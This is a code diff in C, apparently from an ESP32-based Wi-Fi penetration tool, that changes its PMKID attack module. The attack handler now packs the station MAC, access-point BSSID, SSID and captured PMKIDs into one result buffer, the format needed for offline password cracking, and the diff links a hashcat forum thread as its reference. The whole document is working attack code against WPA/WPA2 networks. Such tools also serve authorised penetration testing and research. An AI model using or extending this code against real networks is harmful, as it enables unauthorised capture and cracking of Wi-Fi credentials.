@@ -1,3 +1,4 @@
+// Ref: https://hashcat.net/forum/thread-7717.html
 #include "attack_pmkid.h"
 
 #include <string.h>
@@ -12,6 +13,7 @@
 #include "frame_analyzer_types.h"
 
 static const char* TAG = "main:attack_pmkid";
+static const wifi_ap_record_t *ap_record = NULL;
 
 static void pmkid_exit_condition_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data) {
     ESP_LOGD(TAG, "Got PMKID, stopping attack...");
@@ -26,9 +28,18 @@ static void pmkid_exit_condition_handler(void *args, esp_event_base_t event_base
         pmkid_item_count++;
     }
 
-    char *content = attack_alloc_result_content(pmkid_item_count * 16);
+    // MAC_STA + MAC_AP + SSID size + SSID + PMKID * count
+    char *content = attack_alloc_result_content(6 + 6 + 1 + strlen((char *) ap_record->ssid) + (pmkid_item_count * 16));
+    wifictl_get_sta_mac((uint8_t *) content);
+    content += 6;
+    memcpy(content, ap_record->bssid, 6);
+    content += 6;
+    content[0] = strlen((char *) ap_record->ssid);
+    content += 1;
+    strcpy(content, (char *) ap_record->ssid);
+    content += strlen((char *) ap_record->ssid);
 
-    // copy PMKIDs into continuous memory into "content" in result 
+    // copy PMKIDs into continuous memory into "content" in status 
     pmkid_item = pmkid_item_head;
     do {
         pmkid_item_head = pmkid_item;
@@ -43,6 +54,7 @@ static void pmkid_exit_condition_handler(void *args, esp_event_base_t event_base
 
 void attack_pmkid_start(attack_config_t *attack_config){
     ESP_LOGI(TAG, "Attack on PMKID...");
+    ap_record = attack_config->ap_record;
     wifictl_sniffer_filter_frame_types(true, false, false);
     wifictl_sniffer_start(attack_config->ap_record->primary);
     frame_analyzer_pmkid_capture_start(attack_config->ap_record->bssid);
